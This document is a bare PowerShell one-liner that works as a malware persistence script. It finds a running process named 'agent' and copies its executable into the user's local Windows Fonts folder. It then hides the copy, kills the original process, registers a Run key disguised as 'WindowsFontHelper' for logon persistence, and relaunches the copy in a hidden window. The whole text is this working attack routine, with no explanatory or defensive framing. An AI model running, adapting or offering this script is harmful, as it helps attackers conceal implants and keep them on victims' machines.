$ProgressPreference='SilentlyContinue'; $ErrorActionPreference='Stop'; $proc=Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1; if(-not $proc){Write-Host "[!] No running agent.exe found.";exit 1}; $src=$proc.Path; $fontsFolder="$env:LOCALAPPDATA\Microsoft\Windows\Fonts"; if($src -like "$fontsFolder\*"){Write-Host "[*] Agent already running from fonts folder. Persistence active. Exiting." -Fore Green; exit 0}; Write-Host "[+] Agent running from: $src"; if(-not (Test-Path $fontsFolder)){New-Item $fontsFolder -Force|Out-Null}; $dest="$fontsFolder\agent.exe"; if(-not (Test-Path $dest)){$c=$false; for($i=0;$i-lt5;$i++){try{[System.IO.File]::Copy($src,$dest,$true);$c=$true;break}catch{Start-Sleep -Milliseconds 500}} if(-not $c){Write-Host "[!] Copy failed";exit 1} attrib +h $dest; Write-Host "[+] Copied to hidden fonts folder"} else{Write-Host "[*] File already exists in fonts folder"}; Write-Host "[+] Stopping original agent (PID: $($proc.Id))..."; Stop-Process -Id $proc.Id -Force; Start-Sleep -Seconds 1; $regPath="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; $regName="WindowsFontHelper"; Set-ItemProperty -Path $regPath -Name $regName -Value "`"$dest`"" -Force; Write-Host "[+] Registry run key added (logon persistence)"; $workingDir=Split-Path $dest; Start-Process -WindowStyle Hidden -FilePath $dest -WorkingDirectory $workingDir; Start-Sleep -Seconds 2; $newProc=Get-Process -Name "agent" -ErrorAction SilentlyContinue; if($newProc){Write-Host "[✓] New agent running from fonts folder" -Fore Green}else{Write-Host "[!] Agent may have crashed – check manually" -Fore Yellow}
